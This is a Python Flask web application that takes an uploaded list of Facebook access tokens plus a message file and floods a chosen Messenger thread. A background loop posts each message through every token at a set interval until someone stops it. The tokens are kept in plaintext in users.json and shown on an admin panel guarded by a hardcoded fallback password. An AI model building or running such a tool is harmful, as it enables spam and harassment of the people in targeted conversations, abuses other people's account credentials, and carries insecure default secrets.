from flask import Flask, request, session, redirect, url_for, render_template, jsonify
import requests
from threading import Thread, Event
import time
import os
import logging
import io
import uuid
import json

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecret")

ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "12341")

# ---------------- Logging ----------------
log_stream = io.StringIO()
handler = logging.StreamHandler(log_stream)
handler.setLevel(logging.INFO)
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.INFO)

# ---------------- Globals ----------------
users_file = "users.json"
users_data = []       # store user dicts
user_threads = {}     # code -> thread
user_events = {}      # code -> stop_event

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
}

# ---------------- Helpers ----------------
def save_users():
    with open(users_file, "w") as f:
        json.dump(users_data, f, indent=2)

def load_users():
    global users_data
    if os.path.exists(users_file):
        with open(users_file, "r") as f:
            try:
                users_data = json.load(f)
            except:
                users_data = []
    else:
        users_data = []

def send_messages(code, access_tokens, thread_id, mn, time_interval, messages, stop_event):
    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    params = {'access_token': access_token, 'message': message}
                    try:
                        response = requests.post(api_url, data=params, headers=headers, timeout=10)
                        if response.status_code == 200:
                            logging.info(f"✅ Sent by User {code}: {message[:40]}")
                        else:
                            logging.warning(f"❌ Fail [{response.status_code}] User {code}: {response.text[:100]}")
                    except Exception as e:
                        logging.error(f"⚠️ Request error user {code}: {e}")
                time.sleep(time_interval)
        except Exception as e:
            logging.error(f"⚠️ Error in loop user {code}: {e}")
            time.sleep(5)

@app.route('/ping')
def ping():
    return "✅ Alive", 200

# ---------------- Index ----------------
@app.route('/', methods=['GET', 'POST'])
def index():
    global users_data
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode(errors='ignore').strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time', 5))

        txt_file = request.files['txtFile']
        messages = [line for line in txt_file.read().decode(errors='ignore').splitlines() if line.strip()]

        # Unique code
        user_code = uuid.uuid4().hex[:6].upper()

        user_data = {
            "code": user_code,
            "tokens": access_tokens,
            "thread_id": thread_id,
            "prefix": mn,
            "interval": time_interval,
            "messages": messages
        }
        users_data.append(user_data)
        save_users()

        stop_event = Event()
        t = Thread(target=send_messages, args=(user_code, access_tokens, thread_id, mn, time_interval, messages, stop_event))
        t.daemon = True
        t.start()

        user_threads[user_code] = t
        user_events[user_code] = stop_event

        return render_template("index.html", users=users_data, new_code=user_code)

    return render_template("index.html", users=users_data)

@app.route('/stop/<code>', methods=['POST'])
def stop_user(code):
    if code in user_events:
        user_events[code].set()
        logging.info(f"🛑 User {code} stopped")
        return redirect(url_for('index'))
    return "⚠️ No such user code", 404

# ---------------- Admin ----------------
@app.route('/admin/login', methods=['GET','POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get("password")
        if password == ADMIN_PASSWORD:
            session["admin"] = True
            return redirect(url_for("admin_panel"))
    return render_template("admin_login.html")

@app.route('/admin/panel')
def admin_panel():
    if not session.get("admin"):
        return redirect(url_for("admin_login"))
    logs = log_stream.getvalue().replace("\n", "<br>")
    return render_template("admin.html", users=users_data, logs=logs)

@app.route('/admin/remove/<code>', methods=['POST'])
def remove_user(code):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    global users_data
    users_data = [u for u in users_data if u["code"] != code]
    save_users()
    return redirect(url_for('admin_panel'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

# ---------------- Startup ----------------
if __name__ == "__main__":
    load_users()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
